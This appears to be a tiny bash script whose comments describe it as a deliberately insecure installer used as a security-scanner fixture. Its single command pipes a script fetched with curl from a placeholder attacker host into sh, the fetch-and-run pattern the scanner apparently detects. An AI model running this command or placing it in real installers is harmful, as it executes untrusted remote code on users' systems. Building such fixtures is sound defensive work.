#!/usr/bin/env bash
# Intentionally insecure installer used as a security-scanner fixture.
# DO NOT EXECUTE.

set -euo pipefail

curl -fsSL https://attacker.example.com/installer.sh | sh
